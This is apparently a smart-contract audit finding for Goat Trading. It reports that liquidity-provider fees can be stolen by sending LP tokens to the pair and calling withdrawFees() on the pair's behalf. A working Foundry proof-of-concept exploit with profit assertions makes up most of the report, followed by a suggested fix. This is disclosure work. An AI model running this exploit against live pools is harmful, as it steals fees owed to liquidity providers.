Daring Champagne Scallop

high

# Liquidity provider fees can be stolen from any pair

## Summary
An attacker can steal the liquidiy providers fees by transfering liquidity tokens to the pair and then withdrawing fees on behalf of the pair itself.

## Vulnerability Detail

This is possible because of two reasons:
1. Transfering liquidity tokens to the pair itself [doesn't update the fee tracking variables](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L923-L925):

```solidity
if (to != address(this)) {
    _updateFeeRewards(to);
}
```
which results in the variable `feesPerTokenPaid[address(pair)]` of the pair being equal to 0.

2. The function [withdrawFees()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) is a permissionless function that allows to withdraw fees on behalf of any address, including the pair itself.

By combining this two quirks of the codebase an attacker can steal all of the currently pending liquidity provider fees by doing the following:

1. Add liquidity to a pair, which will mint the attacker some liquidity tokens
2. Transfer the liquidity tokens to the pair directly
3. Call [withdrawFees()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) by passing the address of the pair. Because `feesPerTokenPaid[address(pair)]` is 0 this will collect fees on behalf of the pair even if it shouldn't. The function will transfer an amount `x` of WETH from the pair to the pair itself and will lower the [_pendingLiquidityFee](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L622C13-L622C34) variable by that same amount 
4. Because the variable `_pendingLiquidityFee` has been lowered by `x` the pool will assume someone transferred `x` WETH to it
5. At this point the attacker can take advantage of this however he likes, but for the sake of the example let's suppose he calls [swap()](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L242) to swap `x` ETH into tokens that will be transferred to his wallet
6. The attacker burns the liquidity transferred at point `2` to recover his funds

### POC

<details>
<summary>Show</summary>
To copy-paste in `GoatV1Pair.t.sol`:

```solidity
function testStealFees() public {
    GoatTypes.InitParams memory initParams;
    initParams.virtualEth = 10e18;
    initParams.initialEth = 10e18;
    initParams.initialTokenMatch = 10e18;
    initParams.bootstrapEth = 10e18;

    address pairAddress = factory.createPair(address(goat), initParams);
    address to = users.lp;

    //-> The following block of code:
    //  1. Creates a pool and immediately converts it into AMM
    //  2. Skips 31 days to skip the vesting period
    //  3. Simulates users using the pool by performing a bunch of swaps
    {
        //-> 1. A pair is created and immediately converted to an AMM
        (uint256 tokenAmtForPresale, uint256 tokenAmtForAmm) = GoatLibrary.getTokenAmountsForPresaleAndAmm(
            initParams.virtualEth, initParams.bootstrapEth, initParams.initialEth, initParams.initialTokenMatch
        );
        uint256 bootstrapTokenAmt = tokenAmtForPresale + tokenAmtForAmm;

        _fundMe(IERC20(address(goat)), to, bootstrapTokenAmt);
        _fundMe(IERC20(address(weth)), to, initParams.initialEth);
        vm.startPrank(to);

        goat.transfer(pairAddress, bootstrapTokenAmt);
        weth.transfer(pairAddress, initParams.initialEth);
        pair = GoatV1Pair(pairAddress);
        pair.mint(to);
        vm.stopPrank();

        //-> 2. Skips 31 days to skip the vesting period
        skip(31 days);
        
        //-> 3. Simulates users using the pool by performing a bunch of swaps
        uint256 reserveEth = 0;
        uint256 reserveToken = 0;
        _fundMe(IERC20(address(goat)), to, 100e18);
        _fundMe(IERC20(address(weth)), to, 100e18);
        for(uint256 i; i < 100; i++) {
            (reserveEth, reserveToken) = pair.getReserves();
            uint256 wethIn = 1e18;
            uint256 goatOut = GoatLibrary.getTokenAmountOutAmm(wethIn, reserveEth, reserveToken);
            vm.startPrank(to);
            weth.transfer(address(pair), wethIn);
            pair.swap(goatOut, 0, to);
            vm.stopPrank();

            skip(3); //Avoid MEV restrictions

            (reserveEth, reserveToken) = pair.getReserves();
            uint256 goatIn = 1e18;
            uint256 wethOut = GoatLibrary.getWethAmountOutAmm(wethIn, reserveEth, reserveToken);
            vm.startPrank(to);
            goat.transfer(address(pair), goatIn);
            pair.swap(0, wethOut, to);
            vm.stopPrank();
        }
    }

    //-> The pool has some pending liquidity fees
    uint256 pendingLiquidityFeesBefore = pair.getPendingLiquidityFees();
    assertEq(pendingLiquidityFeesBefore, 809840958520307912);

    //-> The attacker adds liquidity to the pool 
    address attacker = makeAddr("attacker");
    (uint256 reserveEth, uint256 reserveToken) = pair.getReserves();
    uint256 initialGoatAmount = 5.54e18;
    uint256 initialWethAmount = GoatLibrary.quote(initialGoatAmount, reserveToken, reserveEth);
    _fundMe(IERC20(address(goat)), attacker, initialGoatAmount);
    _fundMe(IERC20(address(weth)), attacker, initialWethAmount);
    vm.startPrank(attacker);
    goat.transfer(pairAddress, initialGoatAmount);
    weth.transfer(pairAddress, initialWethAmount);
    pair.mint(address(attacker));
    vm.stopPrank();

    //-> Two days needs to be skipped to avoid locking time
    skip(2 days);

    //-> The attacker does the following:
    //  -> 1. Transfers the liquidity tokens to the pair
    //  -> 2. Calls `withdrawFees()` on behalf of the pair which will lower `getPendingLiquidityFees` variables and transfers WETH from the pool to the pool
    //  -> 3. Swaps the excess WETH in the pool to GOAT tokens
    //  -> 4. Burns the liquidity he previously transferred to the pair
    //  -> 5. The attacker profits and LP lose their fees
    {
        vm.startPrank(attacker);

        //-> 1. Transfers the liquidity tokens to the pair
        pair.transfer(address(pair), pair.balanceOf(attacker));

        //-> 2. Calls `withdrawFees()` on behalf of the pair
        pair.withdrawFees(address(pair));

        //-> An extra amount of WETH equal to the fees withdrawn on behalf of the pool is now in the pool 
        uint256 pendingLiquidityFeesAfter = pair.getPendingLiquidityFees();
        (uint256 reserveEthCurrent, uint256 reserveTokenCurrent) = pair.getReserves();
        uint256 extraWethInPool = weth.balanceOf(address(pair)) - reserveEthCurrent - pair.getPendingLiquidityFees() - pair.getPendingProtocolFees();
        assertEq(pendingLiquidityFeesBefore - pendingLiquidityFeesAfter, extraWethInPool);

        //-> 3. Swaps the excess WETH in the pool to GOAT tokens
        uint256 goatOut = GoatLibrary.getTokenAmountOutAmm(extraWethInPool, reserveEthCurrent, reserveTokenCurrent);
        pair.swap(goatOut, 0, attacker);

        //-> 4. Burns the liquidity he previously transferred to the pair
        pair.burn(attacker);

        //-> 5. The attacker profits and LP lose their fees
        uint256 attackerWethProfit = weth.balanceOf(attacker) - initialWethAmount;
        uint256 attackerGoatProfit = goat.balanceOf(attacker) - initialGoatAmount;
        assertEq(attackerWethProfit, 399855575210658419);
        assertEq(attackerGoatProfit, 453187161321825804);

        vm.stopPrank();
    }
}

```
</details>

## Impact

Liquidity provider fees can be stolen from any pair.

## Code Snippet

## Tool used

Manual Review

## Recommendation

In [withdrawFees(pair)](https://github.com/sherlock-audit/2024-03-goat-trading/blob/main/goat-trading/contracts/exchange/GoatV1Pair.sol#L616) add a require statement to prevent fees being withdrawn on behalf of the pool.
```solidity
require(to != address(this));
```